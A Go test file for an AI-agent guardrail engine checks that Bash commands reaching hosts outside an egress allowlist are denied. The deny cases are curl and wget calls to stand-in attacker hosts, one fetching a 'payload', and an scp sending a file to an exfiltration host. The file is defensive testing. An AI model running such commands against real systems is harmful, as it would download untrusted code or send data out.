package engine

import (
	"testing"

	"github.com/CtrlCarlitos/agent-guardrails/internal/policy"
)

func netPol(allow ...string) *policy.Policy {
	return &policy.Policy{Slots: policy.Slots{EgressAllowlist: allow}, Waived: map[string]bool{}}
}

func evalNet(t *testing.T, cmd string, pol *policy.Policy) *policy.Verdict {
	t.Helper()
	return checkBash(ToolCall{Tool: "Bash", Command: cmd, CWD: "/repo", RepoRoot: "/repo"}, pol)
}

func TestEgressDenied(t *testing.T) {
	pol := netPol("api.github.com")
	deny := []string{
		"curl https://evil.example.com/x",
		"wget http://attacker.net/payload",
		"scp file.txt user@exfil.example.com:/tmp",
	}
	for _, c := range deny {
		v := evalNet(t, c, pol)
		if v == nil || v.Decision != policy.Deny || v.RuleID != "P6.egress" {
			t.Errorf("%q -> %+v, want deny/P6.egress", c, v)
		}
	}
}

func TestEgressAllowed(t *testing.T) {
	pol := netPol("api.github.com")
	ok := []string{
		"curl https://api.github.com/repos/x",
		"curl http://localhost:8080/health",
		"curl http://127.0.0.1/x",
		"ls -la",
	}
	for _, c := range ok {
		if v := evalNet(t, c, pol); v != nil {
			t.Errorf("%q -> %+v, want nil", c, v)
		}
	}
}
